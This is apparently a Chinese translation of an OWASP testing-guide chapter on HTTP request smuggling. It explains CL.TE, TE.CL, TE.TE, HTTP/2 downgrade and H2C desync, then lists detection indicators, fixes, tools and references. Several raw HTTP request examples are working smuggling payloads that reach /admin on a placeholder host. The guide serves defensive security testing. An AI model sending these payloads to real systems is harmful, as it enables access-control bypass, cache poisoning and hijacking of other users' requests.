# 测试HTTP请求走私

|ID          |
|------------|
|WSTG-INPV-16|

## 概述

HTTP请求走私是一类漏洞，由前端和后端组件如何解析HTTP请求的差异引起。当代理、负载均衡器或API网关等中间人解释请求边界的方式与后端服务器不同时，攻击者可能注入或"走私"隐藏请求，这些请求将以意外顺序处理。

现代基础设施通过引入HTTP/2、协议降级（HTTP/2 → HTTP/1.1）和明文升级（H2C）显著扩大了攻击面，在这些地方，请求规范化和转换逻辑经常偏离RFC预期。

请求走私漏洞产生于两个或多个HTTP解析器对请求开始或结束位置不一致的情况。从历史上看，这种差异最常见于对`Content-Length`（CL）和`Transfer-Encoding`（TE）头的冲突解释。

在现代架构中，额外的去同步向量来自：

- HTTP/2到HTTP/1.1转换层
- 明文HTTP/2（H2C）升级机制
- 头规范化不匹配
- 协议降级期间重新引入禁止的头
- 跨协议边界连接重用

这些行为可能导致持久去同步、缓存中毒、凭据劫持和访问控制绕过。

## 测试目标

- 识别前端和后端组件之间的请求边界不一致
- 检测经典CL/TE去同步漏洞
- 评估协议转换逻辑（HTTP/2 → HTTP/1.1）
- 评估H2C升级处理和降级安全性
- 确认后端请求队列中毒

## 如何测试

### 黑盒测试

#### 测试CL.TE去同步

在CL.TE场景中，前端使用`Content-Length`确定请求大小，而后端遵循`Transfer-Encoding`。

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

预期结果：

- 后端在`0`块处停止解析
- 走私请求保留在缓冲区中
- 后续合法请求被破坏或返回意外响应（如404）

#### 测试TE.CL去同步

在TE.CL场景中，前端正确处理分块编码，而后端依赖`Content-Length`。

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Content-Length: 0

0
```

预期结果：

- 后端提前停止
- 剩余payload被解释为新请求
- 可能发生未授权端点访问或请求中毒

#### 测试TE.TE（混淆的Transfer-Encoding）

如果两个服务器都支持`Transfer-Encoding`，头混淆可能导致其中一个解析器忽略它。

常用技术包括：

- 空格操作
- 头重复
- 非标准分隔符

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 44
Transfer-Encoding:	chunked
Transfer-Encoding: identity

0

GET /404 HTTP/1.1
Foo: bar
```

### 现代攻击向量

#### HTTP/2到HTTP/1.1去同步

在许多部署中，客户端使用HTTP/2与边缘服务器通信，而后端服务仍通过HTTP/1.1运行。在协议转换期间，中间人必须从HTTP/2帧重构HTTP/1.1请求。

常见故障点包括：

- `Content-Length`重构不正确
- 重新引入逐跳头
- 多个逻辑请求折叠为单个后端请求

> 注意：HTTP/2降级本身并非固有漏洞。
> 当协议转换重构违反后端解析假设的HTTP/1.1请求时，可利用性变得可能，导致请求边界去同步。

测试方法：

- 发送具有冲突长度语义的多个HTTP/2 DATA帧
- 通过时序差异或响应拆分观察后端行为
- 监控请求队列中毒

##### 示例：通过请求重构进行HTTP/2降级走私

在此场景中，客户端通过HTTP/2与前端通信，而后端仅支持HTTP/1.1。中间人从多个HTTP/2 DATA帧重构HTTP/1.1请求。

**HTTP/2（概念表示）：**

- DATA帧1：

```http
0\r\n\r\n
```

- DATA帧2：

```http
GET /admin HTTP/1.1
Host: internal
```

**重构的HTTP/1.1请求（后端视图）：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 0

GET /admin HTTP/1.1
Host: internal
```

如果前端将请求视为完整，而后端继续解析缓冲数据，则第二个请求可能以意外顺序处理，导致请求走私。

> 隐式降级：
> 即使在没有明确`Upgrade: h2c`机制的情况下，许多CDN和反向代理在将请求转发到后端服务时，也会悄然将HTTP/2客户端连接降级为HTTP/1.1。
> 这些隐式降级扩大了走私攻击面，特别是与连接重用和请求规范化不足相结合时。

#### H2C走私（明文HTTP/2升级）

H2C允许使用`Upgrade: h2c`机制将HTTP/1.1连接升级到HTTP/2。
与协议降级不同，H2C走私发生在就地协议转换期间，前端和后端组件可能在同一连接的解析状态上暂时不同意，可能在后端缓冲区中留下残留字节。

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

0

GET /admin HTTP/1.1
Host: internal
```

风险因素：

- 部分升级接受
- 后端继续解析为HTTP/1.1
- 升级后处理走私请求

#### 通过协议降级的请求队列中毒

某些代理将HTTP/2请求降级到HTTP/1.1，但未能完全规范化：

- `Content-Length`
- 重复头
- 无效伪头顺序

攻击者可以利用此漏洞毒化持久后端连接，影响多个用户。

### 漏洞指标

- 跨相同请求的响应不一致
- 意外的404或400响应
- 延迟或不匹配的响应
- 跨用户响应泄露

## 修复

- 强制执行严格的RFC兼容解析
- 规范化所有中间人之间的请求处理
- 在不需要的地方禁用H2C
- 避免对不可信连接进行协议降级
- 在解析错误时终止并重新验证后端连接

## 工具

- [HTTP请求走私者（Burp Suite扩展）](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
- [Smuggler（Python）by defparam](https://github.com/defparam/smuggler)
- [h2csmuggler by Bishop Fox](https://github.com/BishopFox/h2csmuggler)

## 参考资料

- [James Kettle，"HTTP去同步攻击：请求走私重生"（PortSwigger研究）](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [James Kettle，"HTTP/2：续集总是更糟"（PortSwigger研究）](https://portswigger.net/research/http2)
- [Jake Miller，"h2C走私：通过HTTP/2明文请求走私"（Bishop Fox）](https://bishopfox.com/blog/h2c-smuggling-request)
- [Amit Klein, Chaim Linhart, Ronen Heled, Steve Orrin:"HTTP请求走私"（2005）](https://web.archive.org/web/20210816212852/https://www.cgisecurity.com/lib/http-request-smuggling.pdf)
- [RFC 7230，第3.3.3节：消息正文长度](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)
- [RFC 7540：超文本传输协议版本2（HTTP/2）](https://datatracker.ietf.org/doc/html/rfc7540)
